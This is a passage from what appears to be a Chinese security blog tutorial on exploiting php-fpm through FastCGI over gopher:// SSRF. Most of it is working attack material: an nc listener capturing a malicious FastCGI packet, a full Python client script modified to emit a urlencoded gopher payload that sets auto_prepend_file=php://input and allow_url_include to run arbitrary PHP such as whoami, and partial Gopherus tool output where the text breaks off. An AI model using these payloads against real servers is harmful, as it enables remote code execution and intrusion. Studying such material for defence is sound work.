+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本机监听</span></span><br><span class="line">[root@ca01h ~] nc -lvvp 9999 &gt; exp.txt</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9999</span><br><span class="line">Ncat: Listening on 0.0.0.0:9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本机执行</span></span><br><span class="line">[root@ca01h ~] python fpm.py 127.0.0.1 /usr/share/nginx/html/index.php -c <span class="string">&quot;&lt;?php echo `whoami`; exit();?&gt;&quot;</span> -p 9999</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这样exp.txt中就我们所需要的恶意FastCGI协议报文，再用下面的小脚本对其urlencode得到最终的Payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;exp.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	pld = f.read()</span><br><span class="line"><span class="keyword">print</span> quote(pld)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>nginx解码一次,php-fpm解码一次。</p>
+</blockquote>
+<p>第二种是修改P牛的脚本，让其直接返回请求的报文并将其urlencode一次：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> six.moves.urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#self.sock.send(request)</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#return self.__waitForResponse(requestId)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, help=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, help=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, help=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, help=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % len(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了</span></span><br><span class="line">    <span class="comment">#response = client.request(params, content)</span></span><br><span class="line">    <span class="comment">#print(force_text(response))</span></span><br><span class="line">    request_ssrf = urlparse.quote(client.request(params, content))</span><br><span class="line">    print(force_text(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + str(args.port) + <span class="string">&quot;/_&quot;</span> + request_ssrf))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210182034.png" alt=""></p>
+<blockquote>
+<p>在利用时，还要对其urlencode一次，可以直接使用Burp的Convert Selection功能：</p>
+</blockquote>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210182946.png" alt=""></p>
+<p>ok，成功实现了代码执行。</p>
+<p>第三种就是使用<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">gopherus</a>工具，同样非常好用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Desktop gopherus --exploit fastcgi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> &#x2F;  _____&#x2F;  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">&#x2F;   \  ___ &#x2F;  _ \\____ \|  |  \_&#x2F; __ \_  __ \  |  \&#x2F;  ___&#x2F;</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___&#x2F;|  | \&#x2F;  |  &#x2F;\___ \</span><br><span class="line"> \______  &#x2F;\____&#x2F;|   __&#x2F;|___|  &#x2F;\___  &gt;__|  |____&#x2F;&#x2F;____  &gt;</span><br><span class="line">        \&#x2F;       |__|        \&#x2F;     \&#x2F;                 \&#x2F;</span><br><span class="line"></span><br><span class="line">		author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line">Give one file name which should be surely present in the server (prefer .php file)</span><br><span class="line">if you don&#39;t know press ENTER we have default one:  &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br><span class="line">Terminal command to run:  whoami</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF: </span><br><span class="line"></span><br><span 